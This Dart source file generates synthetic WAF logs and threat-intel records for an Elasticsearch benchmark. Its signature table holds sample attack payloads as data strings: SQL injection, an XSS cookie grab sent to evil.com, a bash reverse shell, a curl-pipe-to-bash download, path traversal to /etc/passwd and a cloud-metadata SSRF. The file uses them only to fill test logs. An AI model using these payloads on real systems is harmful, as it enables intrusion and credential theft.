import 'dart:math';
import 'package:intl/intl.dart';

class LogGeneratorService {
  static final Random _rand = Random();

  static const List<String> _hostnames = [
    'TebiProtec-WAF01',
    'TebiProtec-WAF02',
    'TebiProtec-WAF03',
    'TebiProtec-WAF04',
    'TebiProtec-WAF05',
    'TebiProtec-Edge01',
    'TebiProtec-Edge02',
    'TebiSecurity-Gate01',
  ];

  static const List<Map<String, dynamic>> _attackSignatures = [
    {
      'sig': 'WAF-SQLI-942100',
      'name': 'SQL Injection Attack: Tautology Detected',
      'severity': 9,
      'payload': r"' OR 1\=1 -- -",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-SQLI-942140',
      'name': 'SQL Injection: Blind Boolean Exploitation',
      'severity': 8,
      'payload': r"1' AND SLEEP(5) #",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-SQLI-942260',
      'name': 'SQL Injection: UNION SELECT Credential Harvesting',
      'severity': 10,
      'payload': r"UNION SELECT null, username, password_hash FROM admin_users--",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-XSS-941100',
      'name': 'Cross-site Scripting (XSS): Script Tag Vector',
      'severity': 7,
      'payload': r"<script>document.location\='http://evil.com/c?c\='+document.cookie</script>",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-XSS-941160',
      'name': 'Cross-site Scripting: Event Handler Attribute Injection',
      'severity': 7,
      'payload': r"<img src\=x onerror\=alert(1)>",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-RCE-932100',
      'name': 'Remote Code Execution: Unix Shell Command Injection',
      'severity': 10,
      'payload': r"; /bin/bash -i >& /dev/tcp/198.51.100.88/4444 0>&1",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-RCE-932150',
      'name': 'Remote Code Execution: Subshell Expansion',
      'severity': 9,
      'payload': r"\$(curl -s http://198.51.100.77/stage2.sh | bash)",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-LFI-930100',
      'name': 'Path Traversal / Local File Inclusion: etc/passwd Access',
      'severity': 8,
      'payload': r"../../../../../../../../etc/passwd",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-LFI-930110',
      'name': 'Path Traversal: Windows System32 Access',
      'severity': 8,
      'payload': r"..\..\..\..\Windows\System32\drivers\etc\hosts",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-SSRF-934100',
      'name': 'Server-Side Request Forgery: Cloud Metadata Endpoint',
      'severity': 9,
      'payload': r"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-JAVA-944100',
      'name': 'Java Deserialization: ysoserial Payload Detected',
      'severity': 10,
      'payload': r"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2MyMw9QMAAMAA...",
      'ruleGroup': 'OWASP_CRS_3.3',
    },
    {
      'sig': 'WAF-BOT-913100',
      'name': 'Automated Threat: High-Speed Web Scraper Detected',
      'severity': 5,
      'payload': r"Automated Crawler Fingerprint - Headless Chrome",
      'ruleGroup': 'Tebi_Bot_Shield',
    },
    {
      'sig': 'WAF-AUTH-949110',
      'name': 'Credential Stuffing: Anomaly Threshold Exceeded',
      'severity': 6,
      'payload': r"Repeated failed auth pattern (50 attempts/sec)",
      'ruleGroup': 'Tebi_Auth_Guard',
    },
  ];

  static const List<String> _methods = [
    'GET', 'POST', 'POST', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'
  ];

  static const List<String> _actions = [
    'Blocked', 'Blocked', 'Blocked', 'Dropped', 'Challenged', 'Allowed', 'Logged'
  ];

  static const List<String> _protocols = ['TCP', 'TCP', 'TCP', 'UDP'];

  static const List<String> _apps = ['HTTPS', 'HTTPS', 'HTTPS', 'HTTP'];

  static const List<String> _urls = [
    'https://portal.tebicorp.internal/api/v2/auth/login',
    'https://portal.tebicorp.internal/api/v2/auth/refresh',
    'https://portal.tebicorp.internal/api/v1/users/export',
    'https://portal.tebicorp.internal/admin/dashboard/config',
    'https://portal.tebicorp.internal/api/v3/billing/checkout',
    'https://portal.tebicorp.internal/wp-admin/admin-ajax.php',
    'https://portal.tebicorp.internal/cgi-bin/diagnostics.cgi',
    'https://portal.tebicorp.internal/api/v1/files/upload',
    'https://portal.tebicorp.internal/oauth2/token',
    'https://portal.tebicorp.internal/rest/v2/customer/orders',
    'https://portal.tebicorp.internal/xmlrpc.php',
    'https://portal.tebicorp.internal/.env',
    'https://portal.tebicorp.internal/.git/config',
    'https://portal.tebicorp.internal/actuator/env',
    'https://portal.tebicorp.internal/actuator/health',
  ];

  static const List<String> _userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'sqlmap/1.7#stable (https://sqlmap.org)',
    'Nikto/2.1.6 (Open Source Security Scanner)',
    'curl/8.4.0',
    'python-requests/2.31.0',
    'Go-http-client/1.1',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Nuclei - Open Source Vulnerability Scanner (v3.2.0)',
    'Nmap Scripting Engine (https://nmap.org/book/nse.html)',
  ];

  static const List<String> _dstIps = [
    '203.0.113.10',
    '203.0.113.11',
    '203.0.113.25',
    '203.0.113.50',
    '198.51.100.100',
    '198.51.100.105',
    '192.0.2.80',
    '192.0.2.44',
  ];

  static const List<int> _dstPorts = [443, 443, 443, 8443, 80, 8080];

  static String _randomPublicIp() {
    // Generate valid random public IPv4 (avoiding 0.0.0.0, 10.x, 127.x, 172.16-31.x, 192.168.x, 224-255.x)
    while (true) {
      final o1 = _rand.nextInt(223) + 1;
      if (o1 == 10 || o1 == 127) continue;
      final o2 = _rand.nextInt(256);
      if (o1 == 172 && o2 >= 16 && o2 <= 31) continue;
      if (o1 == 192 && o2 == 168) continue;
      final o3 = _rand.nextInt(256);
      final o4 = _rand.nextInt(254) + 1;
      return '$o1.$o2.$o3.$o4';
    }
  }

  /// Generates a single WAF log line in RFC3164 Syslog + CEF format
  static String generateWafLog({DateTime? timestamp}) {
    final now = timestamp ?? DateTime.now();
    // RFC3164 Syslog timestamp format: "MMM dd HH:mm:ss" (e.g. "Nov 03 18:59:12")
    final syslogDateFormat = DateFormat('MMM dd HH:mm:ss');
    final formattedTime = syslogDateFormat.format(now);
    final rt = now.millisecondsSinceEpoch;

    final hostname = _hostnames[_rand.nextInt(_hostnames.length)];
    final attack = _attackSignatures[_rand.nextInt(_attackSignatures.length)];
    final srcIp = _randomPublicIp();
    final spt = _rand.nextInt(64511) + 1024;
    final dstIp = _dstIps[_rand.nextInt(_dstIps.length)];
    final dpt = _dstPorts[_rand.nextInt(_dstPorts.length)];
    final proto = _protocols[_rand.nextInt(_protocols.length)];
    final act = _actions[_rand.nextInt(_actions.length)];
    final app = _apps[_rand.nextInt(_apps.length)];
    final method = _methods[_rand.nextInt(_methods.length)];
    final url = _urls[_rand.nextInt(_urls.length)];
    final userAgent = _userAgents[_rand.nextInt(_userAgents.length)];
    final dvchost = 'waf0${_rand.nextInt(8) + 1}.tebicorp.net';

    final sigId = attack['sig'] as String;
    final attackName = attack['name'] as String;
    final severity = attack['severity'] as int;
    final ruleGroup = attack['ruleGroup'] as String;
    final matchedPayload = attack['payload'] as String;

    return '<134>$formattedTime $hostname CEF:0|TebiSecurity|TebiProtec|4.2.1-rc9|$sigId|$attackName|$severity|rt=$rt src=$srcIp spt=$spt dst=$dstIp dpt=$dpt proto=$proto act=$act app=$app requestMethod=$method request=$url requestClientApplication=$userAgent cs1Label=RuleGroup cs1=$ruleGroup cs2Label=MatchedPayload cs2=$matchedPayload dvchost=$dvchost';
  }

  /// Generates a batch of Elasticsearch documents containing the raw WAF log
  static List<Map<String, dynamic>> generateBatch(int count, {DateTime? baseTime}) {
    final now = baseTime ?? DateTime.now();
    final List<Map<String, dynamic>> docs = List.generate(count, (index) {
      // Slight jitter in timestamps for realism
      final docTime = now.subtract(Duration(milliseconds: index * 10));
      final rawLog = generateWafLog(timestamp: docTime);
      return {
        '@timestamp': docTime.toUtc().toIso8601String(),
        'message': rawLog,
      };
    });
    return docs;
  }

  /// Generates threat intelligence records for the enrich policy benchmark
  static List<Map<String, dynamic>> generateThreatIntelRecords(int count) {
    const threatTypes = ['botnet_c2', 'tor_exit', 'scanner', 'exploit_source', 'proxy', 'apt_actor'];
    const countries = ['US', 'CN', 'RU', 'NL', 'DE', 'BR', 'KR', 'GB', 'IR', 'FR'];
    const asns = [
      'AS15169 Google LLC',
      'AS16509 Amazon.com',
      'AS13335 Cloudflare',
      'AS4134 Chinanet',
      'AS20473 The Constant Company',
      'AS9009 M247 Europe',
      'AS51167 Contabo GmbH',
      'AS60068 Datacamp Limited',
    ];

    return List.generate(count, (i) {
      final ip = _randomPublicIp();
      final score = _rand.nextInt(100) + 1;
      return {
        'ip': ip,
        'threat_type': threatTypes[_rand.nextInt(threatTypes.length)],
        'confidence_score': score,
        'country_code': countries[_rand.nextInt(countries.length)],
        'asn': asns[_rand.nextInt(asns.length)],
        'is_active': _rand.nextBool(),
        'last_observed': DateTime.now().subtract(Duration(days: _rand.nextInt(30))).toUtc().toIso8601String(),
      };
    });
  }
}
